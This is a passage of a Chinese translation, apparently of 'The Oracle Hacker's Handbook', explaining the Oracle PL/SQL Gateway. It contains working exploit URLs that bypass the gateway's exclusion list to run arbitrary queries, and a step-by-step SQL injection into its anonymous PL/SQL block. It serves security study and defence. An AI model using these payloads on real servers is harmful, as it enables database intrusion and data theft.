class="line">\x53\x45\x43\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45</span><br><span class="line">S   E   C   R   E   T       I   N   V   A   D   E</span><br><span class="line">\x20\x4F\x4E\x20\x54\x55\x45\x53\x44\x41\x59</span><br><span class="line">    O   N       T   U   E   S   D   A   Y</span><br></pre></td></tr></table></figure><h3 id="一般特权"><a href="#一般特权" class="headerlink" title="一般特权"></a>一般特权</h3><p>我已经看到许多服务器已授予 PUBLIC DBMS_RLS 的执行权限，以及一些关于虚拟专用数据库的教程也是如此。 这不是一个好主意。 还有其他包应该有PUBLIC的执行权限，比如SYS.LTADM，它有一个叫做CREATERLSPOLICY的过程，直接调用DBMS_RLS.ADD_POLICY过程。 DBMS_FGA 显然是另一个。 WKSYS 拥有的 WK_ADM 可由 PUBLIC 执行并允许对策略进行有限的修改。</p><p>最后，如果有人可以授予自己 EXEMPT ACCESS POLICY 系统特权 - 例如，通过 SQL 注入缺陷 - 那么策略将不适用于他们。</p><h2 id="攻击Oracle-PL-SQL-Web应用程序"><a href="#攻击Oracle-PL-SQL-Web应用程序" class="headerlink" title="攻击Oracle PL/SQL Web应用程序"></a>攻击Oracle PL/SQL Web应用程序</h2><p>Oracle PL/SQL 网关提供了通过 Web 在 Oracle 数据库服务器中执行 PL/SQL 过程的能力。 它提供了一个网关，即从 Internet 到 Web 上的后端 Oracle 数据库服务器的路径。 当用户使用 Web 浏览器连接到运行 Oracle PL/SQL 网关的 Web 服务器时，网关只是将用户的请求代理到执行请求的数据库服务器。 Oracle PL/SQL 网关内置于 Oracle 门户、Oracle 应用程序、服务器和 Oracle HTTP 服务器。</p><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/10.png"></p><h3 id="认识Oracle-PL-SQL网关"><a href="#认识Oracle-PL-SQL网关" class="headerlink" title="认识Oracle PL/SQL网关"></a>认识Oracle PL/SQL网关</h3><p><strong>PL/SQL 网关 URL</strong></p><p>PL/SQL Web 应用程序的 URL 通常很容易识别，并且通常以以下开头（xyz 可以是任何字符串并表示数据库访问描述符，稍后您将了解更多信息）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/xyz</span><br><span class="line">http://server.example.com/xyz/owa</span><br><span class="line">http://server.example.com/xyz/plsql</span><br></pre></td></tr></table></figure><p>虽然这些示例中的第二个和第三个表示来自旧版本 PL/SQL 网关的 URL，但第一个来自在 Apache 上运行的更新版本。 在 plsql.conf Apache 配置文件中，/pls 是默认值，指定为一个位置，PLS 模块作为处理程序。 但是，位置不必是 /pls。 URL 中缺少文件扩展名可能表明存在 Oracle PL/SQL 网关。 考虑以下 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/aaa/bbb/xxxxx.yyyyy</span><br></pre></td></tr></table></figure><p>如果 xxxxx.yyyyy 被替换为类似于“ebank.home”、“store.welcome”、“auth.login”或“books.search”的内容，那么 PL/SQL 网关很有可能是 正在使用。 您可以执行一些简单的测试来验证这一点，但在查看这些之前，让我们充分探索 URL 语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/pkg.proc</span><br></pre></td></tr></table></figure><p>在此 URL 中，xyz 是数据库访问描述符或 DAD。 DAD 指定有关数据库服务器的信息，以便 PL/SQL 网关可以连接。 它包含诸如 TNS 连接字符串、用户 ID 和密码、身份验证方法等信息。 这些 DAD 在更新版本中的 dads.conf Apache 配置文件或旧版本中的 wdbsvr.app 文件中指定。 一些默认 DAD 包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORASSO</span><br><span class="line">PORTAL</span><br><span class="line">SIMPLEDAD</span><br><span class="line">SSODAD</span><br></pre></td></tr></table></figure><p>上面显示的URL中的pkg是存储在后端数据库服务器中的PL/SQL包的名称，proc是包导出的过程。 将 PL/SQL 包视为存在于 Oracle 数据库服务器中的程序的最佳方式，每个过程都公开了一些可以调用的功能。 例如，您可以编写一个 Calculator PL/SQL 包。 该包将被称为 CALC，它将具有调用 ADD、SUBTRACT、DIVIDE 和 MULTIPLY 的过程。 然后您可以通过 PL/SQL 网关执行这些过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure><p>CALC包的源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-- CALC PL/SQL Package</span><br><span class="line">-- create the package specification</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER);</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">-- create package&#x27;s body</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X + Y);</span><br><span class="line">      END ADD;</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X - Y);</span><br><span class="line">      END SUBTRACT;</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X / Y);</span><br><span class="line">      END DIVIDE;</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X * Y);</span><br><span class="line">      END MULTIPLY;</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON CALC TO PUBLIC;</span><br></pre></td></tr></table></figure><p>这提出了一个有趣的观点：由于 CALC 包可能存在于许多模式中的任何一个模式中，网关如何“知道”去哪里查找？ 在 DAD 中指定的用户名通常表示模式，但请记住在开篇章节中网关就是这样：进入数据库的网关。 如果我们指定不同的模式，我们可以访问其他包。 假设 SCOTT 创建了 CALC 包，我们可以访问它——即使 DAD 中指定的模式是 FOO：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/SCOTT.calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure><p>这是 Oracle PL/SQL 网关的主要弱点之一。</p><p><strong>Oracle门户</strong></p><p>Oracle 门户应用程序构建在 Oracle PL/SQL 网关之上。 如果您看到类似的 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/portal/page?_pageid=number&amp;_dad=portal&amp;_schema</span><br><span class="line">=PORTAL</span><br></pre></td></tr></table></figure><p>然后服务器正在运行的网关。 将上述门户 URL 转换为网关 URL 需要您采用 dad 参数并将其附加到 /pls：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/portal/null</span><br></pre></td></tr></table></figure><h3 id="验证Oracle-PL-SQL网关是否存在"><a href="#验证Oracle-PL-SQL网关是否存在" class="headerlink" title="验证Oracle PL/SQL网关是否存在"></a>验证Oracle PL/SQL网关是否存在</h3><p>有时，应用程序使用 Oracle PL/SQL 网关可能并不明显。 本节介绍了一些可用于测试的方法。</p><p><strong>Web 服务器 HTTP 服务器响应头</strong></p><p>通过获取 HTTP Server 响应头，您通常可以判断 PL/SQL 网关是否存在。 以下是您可能会看到的一些有效回复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Oracle-Application-Server-10g</span><br><span class="line">Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.0.0</span><br><span class="line"></span><br><span class="line">Oracle HTTP Server Powered by Apache</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0</span><br><span class="line"></span><br><span class="line">Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.2EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_listener3.0.2.0.0/2.14FC1</span><br><span class="line"></span><br><span class="line">Oracle9iAS/9.0.2 Oracle HTTP Server</span><br><span class="line">Oracle9iAS/9.0.3.1 Oracle HTTP Server</span><br></pre></td></tr></table></figure><p>这些是通过搜索“inurl:plsql oracle”和“inurl:owa oracle”从谷歌上发现的服务器中获取的。</p><p>如果您不确定某个应用程序是否正在使用 Oracle PL/SQL 网关，您可以针对该信息执行一些快速测试。 如果应用程序正在使用网关，那么将过程设置为 NULL 应该会导致 Web 服务器返回一个空的 200 响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/null</span><br></pre></td></tr></table></figure><p>发生这种情况是因为 PL/SQL 中的 NULL 相当于无操作； 如果你得到一个空正文的 200 响应，你可以推断无操作成功完成。</p><p>在网关的更高版本中，请求 OWA_UTIL.SIGNATURE 作为过程应该导致 403 Forbidden 响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/owa_util.signature</span><br></pre></td></tr></table></figure><p>在这里，我们收到了禁止响应，因为此过程存在安全风险，并且 Oracle Portal 默认阻止对其进行访问。 如果您正在处理 Oracle Portal 的早期版本，从而可以获得对 OWA_UTIL 的访问，那么您应该得到类似于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Web Toolkit on date&quot;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Cartridge on date&quot;</span><br></pre></td></tr></table></figure><p><strong>Oracle PL/SQL 网关如何与数据库服务器通信</strong></p><p>使用 SQL*Plus 等标准客户端，普通用户可以执行 PL/SQL 过程，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; exec package.procedure(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure><p>或者，用户可以在匿名 PL/SQL 块中执行该过程，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; declare</span><br><span class="line">buff varchar2(20):=&#x27;foo&#x27;;</span><br><span class="line">begin</span><br><span class="line">package.procedure(buff);</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>PL/SQL 网关本质上做同样的事情。 它采用用户请求的包和过程的名称，并将其嵌入到 PL/SQL 的匿名块中，将其发送到数据库服务器以供执行。 随着时间的推移，匿名 PL/SQL 块的确切内容发生了变化，但如果我们请求 <a href="http://server/pls/dad/foo.bar?xyz=123%EF%BC%8C%E5%AE%83%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%83%8F%E8%BF%99%E6%A0%B7%EF%BC%9A">http://server/pls/dad/foo.bar?xyz=123，它看起来像这样：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line"></span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar(XYZ=&gt;:XYZ);</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure><p>需要注意的关键行是 19 和 24。在第 19 行，根据已知的“坏”字符串列表检查用户的请求。 这构成了 PL/SQL 排除列表的一部分，稍后您将了解更多信息。 如果用户请求的包和过程不包含坏字符串，则过程在第 24 行执行。XYZ 参数作为绑定变量传递。 稍后您将学习如何操作您的请求，以便您可以在这个匿名块中嵌入任意 PL/SQL - 从而获得对其执行的后端数据库服务器的完全控制。</p><h3 id="攻击PL-SQL网关"><a href="#攻击PL-SQL网关" class="headerlink" title="攻击PL/SQL网关"></a>攻击PL/SQL网关</h3><p>本节着眼于攻击 PL/SQL 网关的方法。 完成此操作的方式取决于补丁级别。 并提供了对 Oracle 修补安全漏洞的方法的深入了解。</p><p><strong>PL/SQL 排除列表</strong></p><p>之前您看到了如何通过指定包所在的架构来访问任何过程（取决于权限）。 这存在明显的安全风险。 为了阻止这种风险，Oracle 引入了 PL/SQL ExclusionList。 此列表最初包含许多已知的错误字符串，这些字符串可能出现在攻击者发出的请求中。 该列表包含以下条目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OWA*</span><br><span class="line">SYS.*</span><br><span class="line">DBMS_*</span><br><span class="line">HTP.*</span><br><span class="line">HTF.*</span><br><span class="line">UTL_*</span><br></pre></td></tr></table></figure><p>由于这些攻击都存在已知的攻击，Oracle 希望阻止访问名称与这些条件匹配的包。 在过去的五年中，一些漏洞允许攻击者绕过 PL/SQL 排除列表并访问这些包。 例如，考虑 SYS 拥有的 OWA_UTIL 包。 这个包包含一个叫做 CELLSPRINT 的过程，它使攻击者能够运行任意 SELECT 查询。 在没有排除列表的服务器中，可以按如下方式执行查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>添加排除列表后，直接尝试访问此包将导致“403 Forbidden”响应。 但是，可以通过在包之前放置换行符来轻松绕过第一个补丁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/%0Aowa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>Oracle 对此进行了修补，但下一个修补程序也可能会失败。 这次的问题是由于后端数据库服务器将十六进制字节 0xFF 视为 Y，而网关没有。 因此，通过请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/S%FFS.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>攻击者可以再次访问包 - %FF 被数据库转换为 Y，使模式名称为 SYS。 此问题是由国际化功能引起的。可以通过将模式名称括在双引号中来解决此问题的补丁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&quot; SYS&quot;.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>这打破了模式匹配。 但是，这在 10g 应用程序服务器上不起作用，因为此版本的 PL/SQL 网关将所有大写字符转换为小写字符，将“SYS”请求为“sys”。 因此，Oracle 将无法找到包，因为带引号的标识符区分大小写。 但是，可以通过在包名称前插入 goto 标签来破坏 10g 应用程序服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&lt;&lt;LBL&gt;&gt;owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>可以通过在各个区域插入任意 SQL 元素来破坏下一个补丁。如果用户请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/FOO.BAR</span><br></pre></td></tr></table></figure><p>执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line"></span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar;</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure><p>请注意，在第 19 行，根据可能源自攻击的已知“坏”值列表对请求的包和过程名称 FOO.BAR 进行检查。 除了检查简单列表中的字符串外，它还检查特殊字符。</p><p>如果用户然后请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/INJECT&#x27;POINT</span><br></pre></td></tr></table></figure><p>执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;inject&#x27;point&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line"></span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   inject&#x27;point;</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>错误日志中生成错误：“PLS-00103：在期望以下其中一项时遇到符号‘POINT’……”这是由于 SQL 注入问题。 为了破坏服务器，攻击者只需要构建和注入特定的查询。有一些障碍需要克服。 首先，它们被限制为由句点分隔的三个 30 个字符的块 - 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure><p>其次，它们注入的任何内容也都可以在第 24 行找到 - 由于它们必须用单引号引起来，因此该行上的 SQL 将不平衡。 他们可以通过将注入字符串的前两个字节设为双减来解决此问题。如果他们现在要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;</span><br><span class="line"></span><br><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;&#x27;, simple_list__, complex_list__,</span><br><span class="line">true))) then</span><br></pre></td></tr></table></figure><p>现在需要闭合括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;)))&#x27;, simple_list__,</span><br><span class="line">complex_list__,true))) then</span><br></pre></td></tr></table></figure><p>第24行为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;)));</span><br></pre></td></tr></table></figure><p>完成后，他们用 THEN 结束 IF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br></pre></td></tr></table></figure><p>第24行为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;))) then rc__:=2;</span><br></pre></td></tr></table></figure><p>现在可以用分号和另一个双减号结束：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;--</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2;--&#x27;,</span><br><span class="line">simple_list__,complex_list__, true))) then</span><br></pre></td></tr></table></figure><p>第24行为 </p><p>–’))) then rc__:=2;–;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 